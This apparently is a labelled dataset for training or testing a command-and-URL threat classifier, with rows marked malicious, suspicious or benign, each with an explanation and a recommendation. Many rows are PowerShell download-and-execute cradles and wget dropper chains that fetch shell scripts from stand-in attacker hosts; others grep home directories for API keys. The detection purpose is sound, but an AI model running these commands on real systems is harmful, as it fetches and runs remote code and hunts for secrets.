Prompt,Label,Explanation,Recommendation
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage45.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
http://www.ninopizzaria.com.br/index.php?option=com_content&view=article&id=104&Itemid=68,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
cabanalife.com/about.php,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage51.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage22.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage16.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage66.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user28/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_22.tar.gz ~/documents/project22/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage30.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user7/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_6.tar.gz ~/documents/project6/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage17.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user31/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_13.tar.gz ~/documents/project13/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage33.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage12.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_11.tar.gz ~/documents/project11/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage42.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_20.tar.gz ~/documents/project20/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
tar -czf archive_23.tar.gz ~/documents/project23/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
tar -czf archive_26.tar.gz ~/documents/project26/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
tar -czf archive_12.tar.gz ~/documents/project12/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage36.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage35.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage26.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
findagrave.com/cgi-bin/fg.cgi?page=gr&GRid=15392090,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage40.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user15/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage50.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage53.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user18/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
tar -czf archive_7.tar.gz ~/documents/project7/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
grep -r 'apikey' /home/user23/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage49.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user32/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage77.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_31.tar.gz ~/documents/project31/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage79.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
tar -czf archive_39.tar.gz ~/documents/project39/,Benign,"Creates a compressed archive of a project directory, standard user activity.",No action needed.
"powershell -exec bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://stage37.exploitnet.net/shell.ps1')""",Malicious,"Executes an obfuscated PowerShell payload, often used in initial access or persistence (T1059.001).",Disable PowerShell in non-admin contexts and investigate DNS logs for the domain.
grep -r 'apikey' /home/user33/projects/,Suspicious,"Scans files for API keys, often a step in secrets discovery or post-exploitation.",Audit access patterns and enforce secure credential management.
wget http://cdn-stage30.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,Malicious,"Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204).","Remove the script, investigate execution logs, and audit /tmp for other payloads."
wget http://cdn-stage7.malicious.biz/dropper.sh -O /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh,Malicious,"Downloads and executes a remote shell script in multiple steps, common in attack toolkits (T1204).","Remove the script, investigate execution logs, and audit /tmp for other payloads."
